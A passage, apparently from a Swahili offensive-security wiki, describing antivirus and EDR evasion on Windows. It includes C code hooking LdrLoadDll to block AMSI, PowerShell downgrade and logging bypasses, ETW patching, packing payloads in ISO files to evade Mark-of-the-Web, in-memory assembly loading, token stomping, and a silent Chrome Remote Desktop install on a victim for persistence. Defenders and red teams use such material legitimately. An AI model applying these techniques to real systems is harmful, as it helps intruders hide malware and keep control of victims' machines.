AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa kwenye mchakato wa sasa. Mbinu thabiti ya kukwepa isiyotegemea lugha ni kuweka user-mode hook kwenye `ntdll!LdrLoadDll` inayorudisha hitilafu pale moduli inayoombwa inapokuwa `amsi.dll`. Matokeo yake, AMSI haipakii na hakuna scan zinazofanyika kwa mchakato huo.<sup>[[23]](#references)</sup>

Muhtasari wa utekelezaji (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Maelezo
- Hufanya kazi kwa PowerShell, WScript/CScript na custom loaders (chochote ambacho kingepakia AMSI).
- Ioanishe na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka mabaki marefu ya command line.
- Imeonekana ikitumiwa na loaders zinazoendeshwa kupitia LOLBins (kwa mfano, `regsvr32` ikiita `DllRegisterServer`).

Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** pia hutengeneza script ya kupita AMSI.
Tool **[https://amsibypass.com/](https://amsibypass.com/)** pia hutengeneza script ya kupita AMSI inayokwepa signature kwa kutumia user-defined function, variables na character expressions zilizobadilishwa kwa random, na kutumia random character casing kwa maneno muhimu ya PowerShell ili kukwepa signature.

**Ondoa signature iliyotambuliwa**

Unaweza kutumia tool kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** ili kuondoa signature ya AMSI iliyotambuliwa kutoka kwenye memory ya process ya sasa. Tool hii huchanganua memory ya process ya sasa kutafuta signature ya AMSI, kisha huifunika kwa maagizo ya NOP, na hivyo kuiondoa kwenye memory.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI kwenye **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia toleo la 2 la Powershell**
Ukitumia toleo la 2 la PowerShell, AMSI haitapakiwa, kwa hiyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging ni kipengele kinachokuruhusu kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kusaidia kwa madhumuni ya ukaguzi na utatuzi wa matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kukwepa kugunduliwa**.

Ili kukwepa PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Tumia PowerShell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchanganuliwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Tumia kikao cha PowerShell kisichodhibitiwa**: Tumia [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuendesha PowerShell bila kuzindua `powershell.exe` (mbinu inayotumiwa na `powerpick` ya Cobalt Strike). Hii hukwepa vidhibiti vinavyohusishwa mahususi na mchakato wa `powershell.exe`, lakini haizimi moja kwa moja AMSI, Script Block Logging, au kila ulinzi mwingine wa PowerShell; kiwango cha ulinzi hutegemea runtime na utekelezaji wa host.


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuigundua. Kuwa mwangalifu na hili; huenda ukahitaji kusimba kwa njia fiche sehemu maalum tu za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), mara nyingi utakutana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mtiririko wa kazi ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza kugeuzwa kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezea: ConfuserEx husimba kila *method body* kwa njia fiche na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hubadilisha PE checksum ili mabadiliko yoyote yaangushe binary. Tumia **AntiTamperKiller** kupata metadata tables zilizosimbwa kwa njia fiche, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Matokeo yana vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) vinavyoweza kuwa muhimu unapounda unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – peana faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bendera:
     • `-p crx` – chagua profile ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za constants.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja kuwa wrappers nyepesi (pia huitwa *proxy calls*) ili kufanya decompilation kuwa ngumu zaidi. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona API za kawaida za .NET kama `Convert.FromBase64String` au `AES.Create()` badala ya functions za wrapper zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary iliyopatikana ndani ya dnSpy, tafuta blobs kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload *halisi*. Mara nyingi, malware huihifadhi kama byte array iliyosimbwa kwa TLV, iliyoanzishwa ndani ya `<Module>.byte_0`.

Mlolongo huu hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – ni muhimu unapofanya kazi kwenye workstation isiyo na muunganisho wa intaneti.

> 🛈  ConfuserEx huunda attribute maalum inayoitwa `ConfusedByAttribute`, ambayo inaweza kutumika kama IOC kupanga samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya LLVM compilation suite inayoweza kutoa usalama mkubwa zaidi wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia uchezewaji.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza code iliyofichwa wakati wa compilation, bila kutumia zana yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework, jambo linalofanya iwe vigumu kidogo kwa mtu anayetaka kuvunja application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za PE files, zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation ya kiwango cha chini kwa lugha zinazoungwa mkono na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuzuia dhana yetu ya kawaida kuhusu mtiririko wa udhibiti.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### Kujifunika kwa kila function kwa usaidizi wa LLVM compiler

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR wakati wowote hazitumiki. Function Peekaboo PoC huchagua majina yaliyotolewa kutoka mangling yenye `REG_`, huingiza entry/exit stubs zinazojitegemea na nafasi kuzunguka machine code ya mwisho, na kutoa masking handler moja ya pamoja katika `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya mtiririko wa udhibiti kwenye backend

Hii inapaswa kufanyika baada ya instruction selection na optimization, kwa sababu mabadiliko haya yanahitaji kushughulikia **kila return inayotolewa** na kujua mpangilio halisi wa x86. `MachineFunctionPass` inayoendeshwa kabla ya kutoa code hutafuta `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho iendelee hadi kwenye epilogue iliyoongezwa, na hubadilisha returns zilizotangulia kuwa `JMP_1 handler`. Hifadhi stack/frame teardown yoyote iliyotengenezwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya hatua za utoaji huruhusu tawi la prologue kulenga epilogue yake inayofuata; kwa `je` ya karibu inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya baiti nne `target - address_after_je`. Calls na jumps kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass inapaswa kurudisha `false` kwa function ambayo haijachaguliwa ikiwa hakuna kilichobadilika; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na uanzishaji kabla ya CRT

PoC huweka XOR key na records za baiti 16 zenye function pointer iliyorekebishwa na loader pamoja na urefu wa wakati wa runtime katika `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler hufikia QWORD kwenye offset `+8` ya record, ikitumia urefu na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa baiti nane pekee, kwa hiyo utafutaji wa wakati wa runtime huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya awali kwenye stub, na kuelekeza upya `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia PE32+ imports ili kutatua `VirtualProtect` ambayo tayari imeingizwa, na huendeshwa kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Uanzishaji huweka sentinel katika `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huweka mwanzo wa function katika `gs:[0xF0]`, hutambua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), anwani ya kurudi katika `[rsp+0x68]` ndiyo mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub huondoa sentinel na kuruka hadi `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler ileile ya symmetric ili kufasiri body. Njia ya mwisho huendelea hadi kwenye epilogue iliyoongezwa, huku kila return iliyotangulia ikiruka moja kwa moja hadi kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, kwa hiyo baada ya kuficha tena, `ret` ya handler hutumia anwani ya kurudi ya caller wa awali na kuhifadhi matokeo ya function katika `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mbinu ya kuficha na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue isiyofichwa yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, hufanya XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo, loop hiyo hiyo hufasiri code wakati wa kuingia na kuificha wakati wa kila kutoka kwa kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria vya kiwango cha juu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point iliyo ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import-table na section-table kabla ya CRT, unaofuatwa na calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa upya kwa handler mmoja;
- writes kwenye `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatwa na mabadiliko ya mara kwa mara ya `VirtualProtect` na XOR writes za byte kwa byte ndani ya executable pages zinazoungwa mkono na image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa cryptographic: file iliyorekebishwa bado ina body ya awali iliyo wazi, na debugger inaweza kusimama kwenye `VirtualProtect` au XOR loop na kunakili function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hufanya kurejesha code bila kuendesha program kuwa rahisi.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa ni za process nzima. Kwa hiyo, kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha tena instructions wakati invocation nyingine bado inazitekeleza; exceptions na exits zisizo za kawaida pia zinaweza kukwepa kufichwa tena. Utekelezaji imara lazima usawazishe mabadiliko, urejeshe protection halisi iliyorejeshwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa kwa thamani maalum, ukague njia za `call` na `jmp` ili kuhakikisha x64 stack alignment, na uite `FlushInstructionCache` baada ya kuandika upya executable bytes. Microsoft inasema wazi kuwa caller anawajibika kuhakikisha instruction-cache coherency wakati executable code inarekebishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda uliwahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye internet na kuziendesha.

Microsoft Defender SmartScreen ni mbinu ya usalama iliyokusudiwa kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hutumia zaidi mbinu inayotegemea sifa, kumaanisha kwamba applications zisizopakuliwa mara nyingi zitasababisha SmartScreen kuonyesha tahadhari na kumzuia mtumiaji wa mwisho kuendesha file (ingawa file bado linaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina la Zone.Identifier ambayo hutengenezwa kiotomatiki wakati wa kupakua files kutoka kwenye internet, pamoja na URL ambayo zilipakuliwa kutoka kwake.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file lililopakuliwa kutoka kwenye internet.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizosainiwa kwa cheti cha kusaini **kinachoaminika** **hazitasababisha SmartScreen kuonyesha tahadhari**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo za **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads ndani ya containers za matokeo ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hii ni demo ya kubypass SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu madhubuti wa kuweka kumbukumbu katika Windows unaoruhusu programu na vipengele vya mfumo **kuweka kumbukumbu za matukio**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kugundua shughuli hasidi.

Kama vile AMSI inavyoweza kuzimwa (kubypassiwa), inawezekana pia kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kuweka kumbukumbu ya matukio yoyote. Hili hufanywa kwa kupachika mabadiliko kwenye kazi hiyo iliyo kwenye memory ili irudi mara moja, hivyo kuzima uwekaji wa kumbukumbu wa ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi kuhusu kupachika mabadiliko kwenye AMSI kwa mchakato mzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Inahusisha **kuanzisha mchakato mpya wa kutumika kama sadaka**, kuingiza msimbo hasidi wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo huo hasidi, kisha kuua mchakato mpya ukikamilika. Njia hii ina faida na hasara zake. Faida ya njia ya fork and run ni kwamba utekelezaji hufanyika **nje ya** mchakato wetu wa Beacon implant. Hii inamaanisha kuwa kitu kikienda vibaya au kugunduliwa wakati wa hatua zetu za post-exploitation, kuna **uwezekano mkubwa zaidi** wa **implant yetu kusalia hai.** Hasara ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioral Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **kwenye mchakato wake wenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuufanya uchunguzwe na AV, lakini hasara ni kwamba kitu kikienda vibaya wakati wa kutekeleza payload yako, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa kuwa mchakato unaweza kuharibika.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu kupakia C# Assembly, angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Ufungashaji upya wa zana za .NET za NativeAOT WebAssembly (WasmForge)

Mbinu za kawaida za `execute-assembly` huhifadhi MSIL inayotambulika na hatimaye kuanzisha CLR. **WasmForge** hubadilisha mazingira ya utekelezaji badala yake: huhamisha mradi wa C# kwenda kwenye target ya majaribio ya NativeAOT-LLVM WASI, huukompile mapema kuwa WebAssembly, na kuingiza module hiyo ndani ya host ya Windows PE inayotumia Wazero. Mchakato unaotokana na hili hauhitaji CLR, JIT, au host ya `dotnet` ya target, kwa hivyo sheria zinazotegemea tu majina ya managed assembly, upakiaji wa CLR, AMSI, au .NET ETW hazitaweza kuona moja kwa moja. Hii ni mbinu ya kukwepa ugunduzi/kufungasha, si njia ya kukwepa mipaka ya ruhusa—guest hubaki na ruhusa na tabia ya OS inayoonekana ya zana asili.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunda mradi wa C#

Njia inayopendekezwa ya build ni kutumia mazingira ya Docker ya mradi, kwa kuwa yanajumuisha .NET 10 SDK, workload ya NativeAOT-LLVM, WASI SDK 24.0, linker, na vitegemezi vya signing. `.csproj` hutambuliwa kiotomatiki; build ya hatua moja hufanya migration, marekebisho ya compatibility, compilation ya WASM, uundaji wa PE, na signing.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Kwa utatuzi wa matatizo au ukaguzi wa code iliyozalishwa, gawanya mchakato katika `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, na mwishowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Picha ya build pia hutumia wrapper ya `wasm-component-ld` ili kuepuka usimbaji wa component wa WASI Preview 2 na kutoa module ya kawaida inayotarajiwa na runtime iliyopachikwa.<sup>[[44]](#references)[[45]](#references)</sup>

### Kuunganisha wasm32 C# na x64 Win32

Huu si urekusanyaji upya wa moja kwa moja. NativeAOT-WASI haina baadhi ya vipengele vya BCL vinavyolenga Windows au hubadilisha tabia yake, na guest ya wasm32 kwa kawaida hutenga nafasi za pointer za baiti nne huku API za x64 zikiweza kurejesha pointer za baiti nane. WasmForge hushughulikia matatizo yote mawili kwa kutumia tabaka zifuatazo zinazozalishwa:<sup>[[44]](#references)</sup>

1. Source patcher hurekebisha tofauti za kisemantiki mahususi kwa AOT na kuelekeza upya miito ya registry, pipes, WMI, identity, directory-service, file-version, LSA na mingine inayofanana kwenda kwa helpers za `Wf*`.
2. P/Invoke scanner hutoa miunganisho ya NativeAOT `DirectPInvoke` ili miito ya `[DllImport]` iunganishwe na alama za C bridge zilizounganishwa badala ya kupakia DLL iliyotangazwa ndani ya guest kwa njia inayobadilika.
3. Pointer zinazoelekezwa kwa host hutumia `ulong` katika C# na `uint64_t` katika C. Dispatcher ya jumla husambaza miito kwa handler ya Win32 ya host; `out8_mask` huashiria nafasi halisi za matokeo za baiti nane ambazo sehemu zake za juu lazima zihifadhiwe. Matokeo yenye umbo la wasm32 ambayo hayajawekewa alama hutumia ulinzi wa snapshot/restore ili uandishi wa x64 usiharibu baiti nne zilizo jirani.
4. Host bridges mahususi hushughulikia operesheni zisizofaa kwa dispatch ya jumla ya syscall, kama vile ufikiaji wa cache ya tiketi za LSA, operesheni za Kerberos/BCrypt zenye matokeo yenye muundo, trafiki ya TCP KDC na maswali ya LDAP.

Kwa mfano, wrapper ya `version.dll!VerQueryValueW` hupitisha anwani nne za host na kuweka biti 2 na 3 (`0xC`) kwa sababu pointer ya value na urefu wake ni nafasi za matokeo za baiti nane. Wrapper yenyewe hubaki ya jumla na hukabidhi jina la DLL, jina la export, arguments na mask kwa `wf_call_v2`; host hutafsiri pointer na kuita API asilia.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Vikwazo na sehemu za kubadilishia ufuatiliaji

Code inayotegemea sana reflection, upakiaji wa dynamic assembly, arbitrary native callbacks, na miundo changamano ya x64 inayorejeshwa kwenye kumbukumbu ya WASM bado inaweza kuhitaji patches kwa kila tool au kushindwa kabisa. Sockets za jumla za WASI Preview 2 zinaweza pia kufikia no-op stubs, kwa hiyo tools zinazotumika hutumia host shims maalum kwa kila protocol. Thibitisha kila command dhidi ya build ya native badala ya kudhani kuwa vipengele vyake vinafanana.<sup>[[44]](#references)[[45]](#references)</sup>

Mbinu hii huhamisha telemetry badala ya kufanya payload isionekane. Utambuzi unaweza kuhamia kwenye PE iliyo na au inayounda WASM module, tabia ya runtime inayofanana na Wazero, ugawaji na unakili usio wa kawaida wa kumbukumbu ya host/guest, uelekezaji wa jumla wa Win32 wa moja kwa moja, hitilafu za signing na PE-resource, pamoja na API calls na trafiki ya mtandao inayotokana na hayo. Kwa hivyo, kukosekana kwa matukio ya CLR-load, AMSI, au .NET ETW hakupaswi kuchukuliwa kama ushahidi kwamba process ni salama.<sup>[[44]](#references)</sup>

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa katika [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza code hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na mshambuliaji**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira kwenye SMB share, unaweza **kutekeleza code yoyote ndani ya kumbukumbu** ya mashine iliyoathiriwa kwa kutumia lugha hizi.

Repo inaonyesha: Defender bado huchanganua scripts, lakini kwa kutumia Go, Java, PHP n.k. tunapata **unyumbufu zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell za nasibu zisizofichwa kwa obfuscation katika lugha hizi yamefanikiwa.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza ruhusa za token kunaweza kuacha process ikiendelea kufanya kazi huku ikiizuia kutekeleza ukaguzi au hatua za kurekebisha zinazohitaji ruhusa za juu.

Ili kuzuia hili, Windows inaweza **kuzuia processes za nje** kupata handles za tokens za security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Software Inayoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa katika [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi tu kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa, kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha ubofye faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi kimyakimya kwenye mashine ya mwathiriwa (ruhusa za admin zinahitajika): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
